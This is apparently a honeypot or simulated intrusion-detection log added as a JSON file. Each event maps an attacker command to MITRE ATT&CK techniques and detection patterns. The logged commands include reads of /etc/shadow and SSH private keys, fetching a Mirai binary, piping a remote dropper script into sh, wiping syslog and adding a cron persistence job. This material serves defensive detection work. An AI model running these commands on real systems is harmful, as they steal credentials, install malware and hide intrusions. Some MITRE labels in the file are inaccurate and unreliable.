@@ -1,0 +1,792 @@
+[
+  {
+    "id": "EVT-1791558606398-810",
+    "timestamp": "2026-10-09T15:10:06.397Z",
+    "ip": "194.26.29.112",
+    "session": 903,
+    "command": "LOGIN: root / default",
+    "isLogin": true,
+    "authDetails": {
+      "username": "root",
+      "password": "default"
+    },
+    "killChainStage": "2. Credential Access",
+    "threatLevel": "MEDIUM",
+    "botnetAttribution": "Unknown Actor",
+    "matchedPatterns": [
+      {
+        "id": "P01",
+        "category": "Credential Brute Force",
+        "name": "Default Root Login Attempt",
+        "severity": "HIGH",
+        "mitre": "T1078.001"
+      }
+    ],
+    "mitreTechniques": [
+      {
+        "id": "T1078.001",
+        "name": "Default Accounts: Root",
+        "tactic": "TA0001"
+      }
+    ]
+  },
+  {
+    "id": "EVT-1791558607011-709",
+    "timestamp": "2026-10-09T15:10:07.011Z",
+    "ip": "194.26.29.112",
+    "session": 903,
+    "command": "id",
+    "isLogin": false,
+    "authDetails": null,
+    "killChainStage": "3. Host Discovery",
+    "threatLevel": "MEDIUM",
+    "botnetAttribution": "Unknown Actor",
+    "matchedPatterns": [
+      {
+        "id": "P14",
+        "category": "Reconnaissance",
+        "name": "Detailed Identity & Group Enumeration (id)",
+        "severity": "MEDIUM",
+        "mitre": "T1033"
+      }
+    ],
+    "mitreTechniques": [
+      {
+        "id": "T1033",
+        "name": "System Owner/User Discovery",
+        "tactic": "TA0007"
+      }
+    ]
+  },
+  {
+    "id": "EVT-1791558607827-589",
+    "timestamp": "2026-10-09T15:10:07.827Z",
+    "ip": "194.26.29.112",
+    "session": 903,
+    "command": "cat /etc/shadow",
+    "isLogin": false,
+    "authDetails": null,
+    "killChainStage": "4. Credential Harvesting",
+    "threatLevel": "CRITICAL",
+    "botnetAttribution": "Unknown Actor",
+    "matchedPatterns": [
+      {
+        "id": "P22",
+        "category": "Credential Harvesting",
+        "name": "Shadow File Hash Theft (/etc/shadow)",
+        "severity": "CRITICAL",
+        "mitre": "T1003.008"
+      }
+    ],
+    "mitreTechniques": [
+      {
+        "id": "T1003.008",
+        "name": "OS Credential Dumping: /etc/shadow",
+        "tactic": "TA0006"
+      }
+    ]
+  },
+  {
+    "id": "EVT-1791558608528-536",
+    "timestamp": "2026-10-09T15:10:08.528Z",
+    "ip": "194.26.29.112",
+    "session": 903,
+    "command": "cat /etc/passwd",
+    "isLogin": false,
+    "authDetails": null,
+    "killChainStage": "4. Credential Harvesting",
+    "threatLevel": "HIGH",
+    "botnetAttribution": "Unknown Actor",
+    "matchedPatterns": [
+      {
+        "id": "P21",
+        "category": "Credential Harvesting",
+        "name": "Password File Exfiltration (/etc/passwd)",
+        "severity": "HIGH",
+        "mitre": "T1003.008"
+      }
+    ],
+    "mitreTechniques": [
+      {
+        "id": "T1003.008",
+        "name": "OS Credential Dumping: /etc/passwd",
+        "tactic": "TA0006"
+      }
+    ]
+  },
+  {
+    "id": "EVT-1791558609134-150",
+    "timestamp": "2026-10-09T15:10:09.134Z",
+    "ip": "194.26.29.112",
+    "session": 903,
+    "command": "curl http://pastebin.fake/dump.sh",
+    "isLogin": false,
+    "authDetails": null,
+    "killChainStage": "5. Payload Staging",
+    "threatLevel": "CRITICAL",
+    "botnetAttribution": "Mirai / Mozi Payload Dropper",
+    "matchedPatterns": [
+      {
+        "id": "P32",
+        "category": "Malware Staging",
+        "name": "Remote Dropper Fetch via CURL",
+        "severity": "CRITICAL",
+        "mitre": "T1105"
+      },
+      {
+        "id": "P33",
+        "category": "Malware Staging",
+        "name": "Malicious Shell Script Staging (.sh download)",
+        "severity": "CRITICAL",
+        "mitre": "T1105"
+      }
+    ],
+    "mitreTechniques": [
+      {
+        "id": "T1105",
+        "name": "Ingress Tool Transfer (wget/curl)",
+        "tactic": "TA0011"
+      }
+    ]
+  },
+  {
+    "id": "EVT-1791558609641-917",
+    "timestamp": "2026-10-09T15:10:09.641Z",
+    "ip": "194.26.29.112",
+    "session": 903,
+    "command": "rm /tmp/systemd-private-xyz.service",
+    "isLogin": false,
+    "authDetails": null,
+    "killChainStage": "6. Persistence & Evasion",
+    "threatLevel": "HIGH",
+    "botnetAttribution": "Unknown Actor",
+    "matchedPatterns": [
+      {
+        "id": "P37",
+        "category": "Defense Evasion",
+        "name": "Indicator Removal / Artifact Deletion (rm)",
+        "severity": "HIGH",
+        "mitre": "T1070.004"
+      }
+    ],
+    "mitreTechniques": [
+      {
+        "id": "T1070.004",
+        "name": "File Deletion",
+        "tactic": "TA0005"
+      }
+    ]
+  },
+  {
+    "id": "EVT-1791558610041-830",
+    "timestamp": "2026-10-09T15:10:10.041Z",
+    "ip": "194.26.29.112",
+    "session": 903,
+    "command": "exit",
+    "isLogin": false,
+    "authDetails": null,
+    "killChainStage": "Session Closed",
+    "threatLevel": "LOW",
+    "botnetAttribution": "Unknown Actor",
+    "matchedPatterns": [
+      {
+        "id": "P00",
+        "category": "Generic Shell Interaction",
+        "name": "Command: exit",
+        "severity": "LOW",
+        "mitre": "T1059.004"
+      }
+    ],
+    "mitreTechniques": [
+      {
+        "id": "T1059.004",
+        "name": "Command Execution",
+        "tactic": "TA0002"
+      }
+    ]
+  },
+  {
+    "id": "EVT-1791559385871-281",
+    "timestamp": "2026-10-09T15:23:05.870Z",
+    "ip": "185.220.101.5",
+    "session": 901,
+    "command": "LOGIN: root / xc3511",
+    "isLogin": true,
+    "authDetails": {
+      "username": "root",
+      "password": "xc3511"
+    },
+    "killChainStage": "2. Credential Access",
+    "threatLevel": "CRITICAL",
+    "botnetAttribution": "Mirai Botnet",
+    "matchedPatterns": [
+      {
+        "id": "P01",
+        "category": "Credential Brute Force",
+        "name": "Default Root Login Attempt",
+        "severity": "HIGH",
+        "mitre": "T1078.001",
+        "tactic": "TA0001"
+      },
+      {
+        "id": "P04",
+        "category": "Credential Brute Force",
+        "name": "Mirai Known Credential Match (root/xc3511)",
+        "severity": "CRITICAL",
+        "mitre": "T1110.001",
+        "tactic": "TA0006"
+      }
+    ],
+    "mitreTechniques": [
+      {
+        "id": "T1078.001",
+        "name": "Default Accounts: Root",
+        "tactic": "TA0001"
+      },
+      {
+        "id": "T1110.001",
+        "name": "Password Spraying: Mirai",
+        "tactic": "TA0006"
+      }
+    ]
+  },
+  {
+    "id": "EVT-1791559386484-237",
+    "timestamp": "2026-10-09T15:23:06.483Z",
+    "ip": "185.220.101.5",
+    "session": 901,
+    "command": "uname -a",
+    "isLogin": false,
+    "authDetails": null,
+    "killChainStage": "3. Host Discovery",
+    "threatLevel": "LOW",
+    "botnetAttribution": "Unknown Actor",
+    "matchedPatterns": [
+      {
+        "id": "P11",
+        "category": "Reconnaissance",
+        "name": "Kernel & Architecture Fingerprinting (uname -a)",
+        "severity": "LOW",
+        "mitre": "T1082",
+        "tactic": "TA0007"
+      }
+    ],
+    "mitreTechniques": [
+      {
+        "id": "T1082",
+        "name": "System Information Discovery",
+        "tactic": "TA0007"
+      }
+    ]
+  },
+  {
+    "id": "EVT-1791559386986-15",
+    "timestamp": "2026-10-09T15:23:06.986Z",
+    "ip": "185.220.101.5",
+    "session": 901,
+    "command": "id",
+    "isLogin": false,
+    "authDetails": null,
+    "killChainStage": "3. Host Discovery",
+    "threatLevel": "MEDIUM",
+    "botnetAttribution": "Unknown Actor",
+    "matchedPatterns": [
+      {
+        "id": "P14",
+        "category": "Reconnaissance",
+        "name": "Detailed Identity & Group Enumeration (id)",
+        "severity": "MEDIUM",
+        "mitre": "T1033",
+        "tactic": "TA0007"
+      }
+    ],
+    "mitreTechniques": [
+      {
+        "id": "T1033",
+        "name": "System Owner/User Discovery",
+        "tactic": "TA0007"
+      }
+    ]
+  },
+  {
+    "id": "EVT-1791559387602-86",
+    "timestamp": "2026-10-09T15:23:07.602Z",
+    "ip": "185.220.101.5",
+    "session": 901,
+    "command": "cat /etc/passwd",
+    "isLogin": false,
+    "authDetails": null,
+    "killChainStage": "4. Credential Harvesting",
+    "threatLevel": "HIGH",
+    "botnetAttribution": "Automated Bot Script",
+    "matchedPatterns": [
+      {
+        "id": "P21",
+        "category": "Credential Harvesting",
+        "name": "Password File Exfiltration (/etc/passwd)",
+        "severity": "HIGH",
+        "mitre": "T1003.008",
+        "tactic": "TA0006"
+      },
+      {
+        "id": "P45",
+        "category": "Behavioral Anomaly",
+        "name": "Hawkes Temporal Burst Rate Anomaly",
+        "severity": "HIGH",
+        "mitre": "T1046",
+        "tactic": "TA0043"
+      }
+    ],
+    "mitreTechniques": [
+      {
+        "id": "T1003.008",
+        "name": "OS Credential Dumping: /etc/passwd",
+        "tactic": "TA0006"
+      }
+    ]
+  },
+  {
+    "id": "EVT-1791559388219-901",
+    "timestamp": "2026-10-09T15:23:08.219Z",
+    "ip": "185.220.101.5",
+    "session": 901,
+    "command": "cd /tmp",
+    "isLogin": false,
+    "authDetails": null,
+    "killChainStage": "1. Reconnaissance",
+    "threatLevel": "LOW",
+    "botnetAttribution": "Automated Bot Script",
+    "matchedPatterns": [
+      {
+        "id": "P45",
+        "category": "Behavioral Anomaly",
+        "name": "Hawkes Temporal Burst Rate Anomaly",
+        "severity": "HIGH",
+        "mitre": "T1046",
+        "tactic": "TA0043"
+      }
+    ],
+    "mitreTechniques": []
+  },
+  {
+    "id": "EVT-1791559388934-72",
+    "timestamp": "2026-10-09T15:23:08.934Z",
+    "ip": "185.220.101.5",
+    "session": 901,
+    "command": "wget http://185.193.66.19/bins/mirai.arm7",
+    "isLogin": false,
+    "authDetails": null,
+    "killChainStage": "5. Payload Staging",
+    "threatLevel": "CRITICAL",
+    "botnetAttribution": "Mirai Botnet",
+    "matchedPatterns": [
+      {
+        "id": "P31",
+        "category": "Malware Staging",
+        "name": "Remote Payload Download via WGET",
+        "severity": "CRITICAL",
+        "mitre": "T1105",
+        "tactic": "TA0011"
+      },
+      {
+        "id": "P34",
+        "category": "Malware Staging",
+        "name": "Binary Dropper Staging (bin/elf download)",
+        "severity": "CRITICAL",
+        "mitre": "T1105",
+        "tactic": "TA0011"
+      },
+      {
+        "id": "P41",
+        "category": "Botnet Signature",
+        "name": "Mirai Botnet Automated Post-Auth Burst",
+        "severity": "CRITICAL",
+        "mitre": "T1587.001",
+        "tactic": "TA0002"
+      },
+      {
+        "id": "P45",
+        "category": "Behavioral Anomaly",
+        "name": "Hawkes Temporal Burst Rate Anomaly",
+        "severity": "HIGH",
+        "mitre": "T1046",
+        "tactic": "TA0043"
+      }
+    ],
+    "mitreTechniques": [
+      {
+        "id": "T1105",
+        "name": "Ingress Tool Transfer (wget/curl)",
+        "tactic": "TA0011"
+      }
+    ]
+  },
+  {
+    "id": "EVT-1791559389548-821",
+    "timestamp": "2026-10-09T15:23:09.548Z",
+    "ip": "185.220.101.5",
+    "session": 901,
+    "command": "touch .bot_payload",
+    "isLogin": false,
+    "authDetails": null,
+    "killChainStage": "6. Persistence & Evasion",
+    "threatLevel": "MEDIUM",
+    "botnetAttribution": "Automated Bot Script",
+    "matchedPatterns": [
+      {
+        "id": "P35",
+        "category": "Persistence",
+        "name": "Backdoor File Creation (touch / echo)",
+        "severity": "MEDIUM",
+        "mitre": "T1059.004",
+        "tactic": "TA0002"
+      },
+      {
+        "id": "P45",
+        "category": "Behavioral Anomaly",
+        "name": "Hawkes Temporal Burst Rate Anomaly",
+        "severity": "HIGH",
+        "mitre": "T1046",
+        "tactic": "TA0043"
+      }
+    ],
+    "mitreTechniques": [
+      {
+        "id": "T1059.004",
+        "name": "Unix Shell",
+        "tactic": "TA0002"
+      }
+    ]
+  },
+  {
+    "id": "EVT-1791559390060-708",
+    "timestamp": "2026-10-09T15:23:10.060Z",
+    "ip": "185.220.101.5",
+    "session": 901,
+    "command": "rm -rf /var/log/syslog",
+    "isLogin": false,
+    "authDetails": null,
+    "killChainStage": "6. Persistence & Evasion",
+    "threatLevel": "CRITICAL",
+    "botnetAttribution": "Automated Bot Script",
+    "matchedPatterns": [
+      {
+        "id": "P37",
+        "category": "Defense Evasion",
+        "name": "Indicator Removal / Artifact Deletion (rm)",
+        "severity": "HIGH",
+        "mitre": "T1070.004",
+        "tactic": "TA0005"
+      },
+      {
+        "id": "P38",
+        "category": "Defense Evasion",
+        "name": "Log Wiping Attempt (rm -rf /var/log)",
+        "severity": "CRITICAL",
+        "mitre": "T1070.002",
+        "tactic": "TA0005"
+      },
+      {
+        "id": "P45",
+        "category": "Behavioral Anomaly",
+        "name": "Hawkes Temporal Burst Rate Anomaly",
+        "severity": "HIGH",
+        "mitre": "T1046",
+        "tactic": "TA0043"
+      }
+    ],
+    "mitreTechniques": [
+      {
+        "id": "T1070.004",
+        "name": "File Deletion",
+        "tactic": "TA0005"
+      },
+      {
+        "id": "T1070.002",
+        "name": "Clear Linux Logs",
+        "tactic": "TA0005"
+      }
+    ]
+  },
+  {
+    "id": "EVT-1791559390469-969",
+    "timestamp": "2026-10-09T15:23:10.469Z",
+    "ip": "185.220.101.5",
+    "session": 901,
+    "command": "exit",
+    "isLogin": false,
+    "authDetails": null,
+    "killChainStage": "Session Closed",
+    "threatLevel": "LOW",
+    "botnetAttribution": "Automated Bot Script",
+    "matchedPatterns": [
+      {
+        "id": "P45",
+        "category": "Behavioral Anomaly",
+        "name": "Hawkes Temporal Burst Rate Anomaly",
+        "severity": "HIGH",
+        "mitre": "T1046",
+        "tactic": "TA0043"
+      }
+    ],
+    "mitreTechniques": []
+  },
+  {
+    "id": "EVT-1791559509221-398",
+    "timestamp": "2026-10-09T15:25:09.221Z",
+    "ip": "194.26.29.112",
+    "session": 901,
+    "command": "LOGIN: root / default",
+    "isLogin": true,
+    "authDetails": {
+      "username": "root",
+      "password": "default"
+    },
+    "killChainStage": "2. Credential Access",
+    "threatLevel": "MEDIUM",
+    "botnetAttribution": "Unknown Actor",
+    "matchedPatterns": [
+      {
+        "id": "P01",
+        "category": "Credential Brute Force",
+        "name": "Default Root Login Attempt",
+        "severity": "HIGH",
+        "mitre": "T1078.001",
+        "tactic": "TA0001"
+      }
+    ],
+    "mitreTechniques": [
+      {
+        "id": "T1078.001",
+        "name": "Default Accounts: Root",
+        "tactic": "TA0001"
+      }
+    ]
+  },
+  {
+    "id": "EVT-1791559509735-826",
+    "timestamp": "2026-10-09T15:25:09.735Z",
+    "ip": "194.26.29.112",
+    "session": 901,
+    "command": "id",
+    "isLogin": false,
+    "authDetails": null,
+    "killChainStage": "3. Host Discovery",
+    "threatLevel": "MEDIUM",
+    "botnetAttribution": "Unknown Actor",
+    "matchedPatterns": [
+      {
+        "id": "P14",
+        "category": "Reconnaissance",
+        "name": "Detailed Identity & Group Enumeration (id)",
+        "severity": "MEDIUM",
+        "mitre": "T1033",
+        "tactic": "TA0007"
+      }
+    ],
+    "mitreTechniques": [
+      {
+        "id": "T1033",
+        "name": "System Owner/User Discovery",
+        "tactic": "TA0007"
+      }
+    ]
+  },
+  {
+    "id": "EVT-1791559510453-443",
+    "timestamp": "2026-10-09T15:25:10.453Z",
+    "ip": "194.26.29.112",
+    "session": 901,
+    "command": "cat /etc/shadow",
+    "isLogin": false,
+    "authDetails": null,
+    "killChainStage": "4. Credential Harvesting",
+    "threatLevel": "CRITICAL",
+    "botnetAttribution": "Unknown Actor",
+    "matchedPatterns": [
+      {
+        "id": "P22",
+        "category": "Credential Harvesting",
+        "name": "Shadow File Hash Theft (/etc/shadow)",
+        "severity": "CRITICAL",
+        "mitre": "T1003.008",
+        "tactic": "TA0006"
+      }
+    ],
+    "mitreTechniques": [
+      {
+        "id": "T1003.008",
+        "name": "OS Credential Dumping: /etc/shadow",
+        "tactic": "TA0006"
+      }
+    ]
+  },
+  {
+    "id": "EVT-1791559511069-805",
+    "timestamp": "2026-10-09T15:25:11.069Z",
+    "ip": "194.26.29.112",
+    "session": 901,
+    "command": "cat /root/.ssh/id_rsa",
+    "isLogin": false,
+    "authDetails": null,
+    "killChainStage": "4. Credential Harvesting",
+    "threatLevel": "CRITICAL",
+    "botnetAttribution": "Automated Bot Script",
+    "matchedPatterns": [
+      {
+        "id": "P23",
+        "category": "Credential Harvesting",
+        "name": "SSH Private Key Hunt (.ssh/id_rsa)",
+        "severity": "CRITICAL",
+        "mitre": "T1552.004",
+        "tactic": "TA0006"
+      },
+      {
+        "id": "P45",
+        "category": "Behavioral Anomaly",
+        "name": "Hawkes Temporal Burst Rate Anomaly",
+        "severity": "HIGH",
+        "mitre": "T1046",
+        "tactic": "TA0043"
+      }
+    ],
+    "mitreTechniques": [
+      {
+        "id": "T1552.004",
+        "name": "Private Keys",
+        "tactic": "TA0006"
+      }
+    ]
+  },
+  {
+    "id": "EVT-1791559511780-435",
+    "timestamp": "2026-10-09T15:25:11.780Z",
+    "ip": "194.26.29.112",
+    "session": 901,
+    "command": "curl -s http://c2.threat-actor.su/dropper.sh | sh",
+    "isLogin": false,
+    "authDetails": null,
+    "killChainStage": "5. Payload Staging",
+    "threatLevel": "CRITICAL",
+    "botnetAttribution": "IoT Dropper Bot",
+    "matchedPatterns": [
+      {
+        "id": "P32",
+        "category": "Malware Staging",
+        "name": "Remote Dropper Fetch via CURL",
+        "severity": "CRITICAL",
+        "mitre": "T1105",
+        "tactic": "TA0011"
+      },
+      {
+        "id": "P33",
+        "category": "Malware Staging",
+        "name": "Malicious Shell Script Staging (.sh download)",
+        "severity": "CRITICAL",
+        "mitre": "T1105",
+        "tactic": "TA0011"
+      },
+      {
+        "id": "P39",
+        "category": "Execution",
+        "name": "Payload Execution via Direct Shell Piping (| sh)",
+        "severity": "CRITICAL",
+        "mitre": "T1059.004",
+        "tactic": "TA0002"
+      },
+      {
+        "id": "P45",
+        "category": "Behavioral Anomaly",
+        "name": "Hawkes Temporal Burst Rate Anomaly",
+        "severity": "HIGH",
+        "mitre": "T1046",
+        "tactic": "TA0043"
+      }
+    ],
+    "mitreTechniques": [
+      {
+        "id": "T1105",
+        "name": "Ingress Tool Transfer (wget/curl)",
+        "tactic": "TA0011"
+      },
+      {
+        "id": "T1059.004",
+        "name": "Direct Shell Execution Pipe",
+        "tactic": "TA0002"
+      }
+    ]
+  },
+  {
+    "id": "EVT-1791559512383-977",
+    "timestamp": "2026-10-09T15:25:12.383Z",
+    "ip": "194.26.29.112",
+    "session": 901,
+    "command": "echo '* * * * * /tmp/.persist' > /etc/cron.d/job",
+    "isLogin": false,
+    "authDetails": null,
+    "killChainStage": "6. Persistence & Evasion",
+    "threatLevel": "MEDIUM",
+    "botnetAttribution": "Automated Bot Script",
+    "matchedPatterns": [
+      {
+        "id": "P40",
+        "category": "Execution",
+        "name": "Cron Scheduled Persistence Probe (/etc/cron)",
+        "severity": "HIGH",
+        "mitre": "T1053.003",
+        "tactic": "TA0003"
+      },
+      {
+        "id": "P35",
+        "category": "Persistence",
+        "name": "Backdoor File Creation (touch / echo)",
+        "severity": "MEDIUM",
+        "mitre": "T1059.004",
+        "tactic": "TA0002"
+      },
+      {
+        "id": "P45",
+        "category": "Behavioral Anomaly",
+        "name": "Hawkes Temporal Burst Rate Anomaly",
+        "severity": "HIGH",
+        "mitre": "T1046",
+        "tactic": "TA0043"
+      }
+    ],
+    "mitreTechniques": [
+      {
+        "id": "T1053.003",
+        "name": "Cron Scheduled Tasks",
+        "tactic": "TA0003"
+      },
+      {
+        "id": "T1059.004",
+        "name": "Unix Shell",
+        "tactic": "TA0002"
+      }
+    ]
+  },
+  {
+    "id": "EVT-1791559512898-286",
+    "timestamp": "2026-10-09T15:25:12.898Z",
+    "ip": "194.26.29.112",
+    "session": 901,
+    "command": "exit",
+    "isLogin": false,
+    "authDetails": null,
+    "killChainStage": "Session Closed",
+    "threatLevel": "LOW",
+    "botnetAttribution": "Automated Bot Script",
+    "matchedPatterns": [
+      {
+        "id": "P45",
+        "category": "Behavioral Anomaly",
+        "name": "Hawkes Temporal Burst Rate Anomaly",
+        "severity": "HIGH",
+        "mitre": "T1046",
+        "tactic": "TA0043"
+      }
+    ],
+    "mitreTechniques": []
+  }
+]
